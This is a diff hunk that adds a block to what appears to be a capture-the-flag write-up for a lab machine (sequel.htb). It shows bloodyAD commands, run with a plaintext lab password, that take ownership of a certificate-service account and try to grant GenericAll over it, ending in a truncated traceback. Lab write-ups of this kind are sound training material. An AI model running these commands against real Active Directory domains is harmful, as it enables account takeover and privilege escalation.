@@ -573,3 +573,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 done! ✨ 🌟 ✨
 ```
 
+```
+#bloodyAD -d sequel.htb --host 10.129.69.59 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
+#bloodyAD -d sequel.htb --host 10.129.69.59 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+Traceback (most recent call last):
+  File "/root/.local/bin/bloodyAD", line 8, in <module>
+    sys.exit(main())
+             ^^^^^^
+```
+
